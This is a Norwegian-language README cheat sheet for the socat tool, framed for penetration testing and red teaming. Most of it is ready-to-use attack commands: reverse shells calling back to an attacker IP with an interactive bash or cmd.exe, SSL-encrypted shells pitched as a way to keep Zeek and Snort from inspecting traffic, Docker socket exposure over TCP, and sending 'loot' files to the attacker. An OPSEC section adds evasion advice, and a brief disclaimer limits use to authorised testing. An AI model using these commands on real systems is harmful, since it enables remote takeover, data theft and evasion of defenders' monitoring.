<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# 🔄 Socat - Komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗ ██████╗  ██████╗ █████╗ ████████╗
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝
  ███████╗██║   ██║██║     ███████║   ██║   
  ╚════██║██║   ██║██║     ██╔══██║   ██║   
  ███████║╚██████╔╝╚██████╗██║  ██║   ██║   
  ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝   
       Multipurpose Relay for Bidirectional Data Transfers & Full TTY Shells
```
<p align="center">
  <img src="https://img.shields.io/badge/Socat-SOcket_CAT-blue?style=for-the-badge" alt="Socat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Exploitation & Shells">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP_SSL_UNIX-green?style=for-the-badge" alt="Protokoller">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="License GPLv2">
</p>

<p align="center">
  <b>🌐 Etabler to toveis bytestrømmer og overfør data mellom filer, rør, enheter, stikkontakter og SSL-tunneler</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Oversikt og Socat-arkitekturen](#-oversikt--socat-arkitekturen)
- [Socat vs Netcat-sammenligning](#-socat-vs-netcat-sammenligning)
- [Installasjon](#-installasjon)
- [Fullly Interactive TTY Reverse Shells](#-fullt-interaktive-tty-reverse-shell)
  - [Attacker Listener (RAW TTY)](#angriper-listener-raw-tty)
  - [Target Payload (Pty Spawn)](#target-payload-pty-spawn)
  - [Windows Target Reverse Shell](#windows-target-reverse-shell)
- [Krypterte omvendte skjell via SSL/TLS](#-krypterte-omvendte-skall-via-ssltls)
  - [Genererer sertifikater](#generering-sertifikater)
  - [Encrypted Listener & Connection](#encrypted-listener--connection)
- [Portvideresending og nettverksreléer](#-portvideresending--nettverksreleer)
  - [Local Port Forwarding](#local-port-videresending)
  - [Forking Listener (Multi-Client)](#forking-listener-multi-client)
  - [UNIX Domain Socket to TCP Relay (Docker Forwarding)](#unix-domene-socket-to-tcp-relay-docker-videresending)
- [Filoverføringer med Socat](#-filoverføringer-med-socat)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Defensive Considerations & OPSEC](#-defensive-considerations--opsec)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)

---

## 🎯 Oversikt og Socat-arkitekturen

**Socat** (SOcket CAT) er et kommandolinjebasert verktøy som etablerer to toveis bytestrømmer og overfører data mellom dem. Fordi strømmene kan konstrueres fra et stort sett med adressetyper (filer, rør, enheter, TCP/UDP-sockets, SSL, raw IP, SOCKS4, UNIX-domene-sockets), blir Socat ofte beskrevet som Netcat på steroider.

I penetrasjonstesting og Red Teaming er Socat legendarisk for to kjernesupermakter:
1. **Instant Fully Interactive TTY Reverse Shells:** Spawning ekte pseudoterminaler (`pty`) med jobbkontroll, piltaster og autofullføring uten å trenge Python eller `stty raw -echo` gymnastikk.
2. **Krypterte SSL/TLS-nettverkstunneler:** Omgå standard IDS-inspeksjon ved å kryptere klartekstnyttelast over SSL.

---

## ⚖️ Socat vs Netcat sammenligning

| Funksjon | Netcat (`nc`) | Nmap `ncat` | Socat (`socat`) |
|--------|--------------|--------|----------------|
| **Native PTY Shell Spawn** | ❌ Nei | ❌ Nei | ✅ Innfødt (`pty,stderr,setsid`) |
| **SSL / TLS-kryptering** | ❌ Nei | ✅ Ja (`--ssl`) | ✅ Native (`OPENSSL-LISTEN`, `OPENSSL`) |
| **Forking Multi-Client Relay**| ❌ Nei | ❌ Nei | ✅ Innfødt (`fork,reuseaddr`) |
| **UNIX Domain Sockets** | ❌ Nei | ✅ Begrenset | ✅ Native (`UNIX-LISTEN`, `UNIX-CONNECT`) |
| **Binær filstørrelse** | Minimum (~40 KB) | Moderat (~500 KB) | Moderat (~400 KB frittstående) |
| **Kommandosyntaks** | Enkle flagg (`-lvnp`) | Flaggbasert (`-lvnp`) | Strømsyntaks (`<type>:<args>`) |

---

## 📥 Installasjon
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y socat

# Arch Linux
sudo pacman -S socat

# RedHat / CentOS / Fedora
sudo dnf install -y socat
```
---

## 💀 Fullt interaktive TTY-omvendte skall

Når du fanger et omvendt skall med standard Netcat, mottar du et ustabilt stumt skall. Socat muliggjør en 100 % stabil, fullstendig interaktiv pseudoterminal med tabulatorfullføring, Ctrl+C-håndtering og støtte for skjermredigering (`vim`, `nano`).

### Angriperlytter (RAW TTY)
```bash
# Listen on port 4444 and hook stdin/stdout directly to your current raw terminal
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
> [!MERK]
> `file:`tty`,raw,echo=0` setter din lokale terminal i råmodus og deaktiverer tegnekko. Hvis tilkoblingen lukkes uventet og terminalen din ikke svarer, skriv `reset` og trykk Enter.

### Målnyttelast (Pty Spawn)
```bash
# Target connects back, spawning a fully interactive PTY bash shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```
#### Oversikt over alternativer:
- `pty`: Tildeler en pseudoterminal på målsystemet.
- `stderr`: Omdirigerer standardfeil inn i kontakten.
- `setsid`: Kjører prosessen i en ny sesjonsgruppe (hindrer drap når forelder går ut).
- `sigint`: Sender avbruddssignaler (Ctrl+C) til den eksterne prosessen i stedet for å drepe økten.
- `sane`: Tilbakestiller terminalkontrollinnstillingene til standard standarder.

### Windows Target Reverse Shell
```bash
# Attacker listener
socat -d -d TCP-LISTEN:4444 STDOUT

# Windows Target connection
socat TCP:10.10.14.5:4444 EXEC:cmd.exe
```
---

## 🔐 Krypterte omvendte skall via SSL/TLS

Hindre Network Security Monitoring (NSM), Zeek og Snort fra å inspisere din omvendte shell-nyttelast ved å kryptere trafikken med et flyktig SSL/TLS-sertifikat.

### Genererer sertifikater
```bash
# 1. Generate private key and self-signed certificate on attacker machine
openssl req -newkey rsa:2048 -nodes -keyout /tmp/socat.key -x509 -days 365 -out /tmp/socat.crt -subj "/CN=corp-update.local"

# 2. Combine key and cert into a single PEM bundle
cat /tmp/socat.key /tmp/socat.crt > /tmp/socat.pem
```
### Kryptert lytter og tilkobling
```bash
# 1. Attacker starts an SSL listener
socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:4443,cert=/tmp/socat.pem,verify=0

# 2. Target connects back over SSL
socat OPENSSL:10.10.14.5:4443,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```
---

## 🔀 Portvideresending og nettverksreleer

Socat kan videresende innkommende trafikk fra ett nettverksgrensesnitt eller port direkte til et annet eksternt mål.

### Lokal portvideresending
```bash
# Forward incoming connections on port 8080 to an internal database server
socat TCP-LISTEN:8080,fork TCP:192.168.1.50:3306
```
### Forking Listener (flerklient)

`fork`-alternativet gjør det mulig for Socat å skape en barneprosess for hver nye innkommende tilkobling, og holde hovedlytteren åpen:
```bash
# Multi-client HTTP proxy relay
socat TCP-LISTEN:80,fork,reuseaddr TCP:10.10.10.200:80
```
### UNIX Domain Socket til TCP Relay (Docker Forwarding)

Når du får tilgang til en lokal Docker daemon-socket (`/var/run/docker.sock`) uten rotrettigheter over nettverket:
```bash
# Expose Docker UNIX socket over TCP port 2375
socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock

# Connect remotely from attacker machine
docker -H tcp://10.10.10.50:2375 ps
```
---

## 📁 Filoverføringer med Socat
```bash
# 1. Attacker prepares receiving listener
socat -u TCP-LISTEN:9001,reuseaddr OPEN:loot.tar.gz,creat

# 2. Target sends file to attacker
socat -u OPEN:loot.tar.gz TCP:10.10.14.5:9001
```
*(`-u`-flagget spesifiserer enveismodus fra den første adressen til den andre).*

---

## ⚡ Hurtigreferansetabell

| Mål | Kommando |
|----------------|--------|
| **Interaktiv TTY-lytter** | `socat file:\`tty\`,raw,echo=0 tcp-listen:<PORT>` |
| **Interaktiv TTY nyttelast** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>` |
| **Kryptert SSL-lytter** | `socat file:\`tty\`,raw,echo=0 OPENSSL-LISTEN:<PORT>,cert=<PEM>,verify=0` |
| **Kryptert SSL nyttelast** | `socat OPENSSL:<IP>:<PORT>,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane` |
| **Portvideresending (relé)** | `socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<RHOST>:<RPORT>` |
| **Utsett UNIX-kontakt** | `socat TCP-LISTEN:<PORT>,fork UNIX-CLIENT:<SOCKET_PATH>` |
| **Filoverføring (mottaker)** | `socat -u TCP-LISTEN:<PORT> OPEN:<OUTFILE>,creat` |
| **Filoverføring (avsender)** | `socat -u OPEN:<INFILE> TCP:<IP>:<PORT>` |

---

## 🛡️ Defensive betraktninger og OPSEC

1. **Trafikkkryptering:** Cleartext TCP reverse shell utsetter kommandoer for IDS/IPS. Bruk alltid `OPENSSL-LISTEN` og `OPENSSL` under røde team-engasjementer.
2. **Prosessovervåking:** Sysmon / EDR-plattformer flaggkommandoer som påkaller `pty,stderr,setsid` som en umiddelbar revers shell-heuristikk.
3. **Frittstående binærfiler:** Når du distribuerer på målsystemer, bruk statisk kompilerte frittstående Socat-binærfiler for å unngå delte bibliotekavhengigheter.

---

## ⚠️ Juridisk ansvarsfraskrivelse

> [!FORSIKTIG]
> Dette juksearket er kun for autorisert penetrasjonstesting, sikkerhetsvurderinger og akademisk forskning. Uautorisert tilgang til datasystemer og nettverksmanipulering er strengt ulovlig.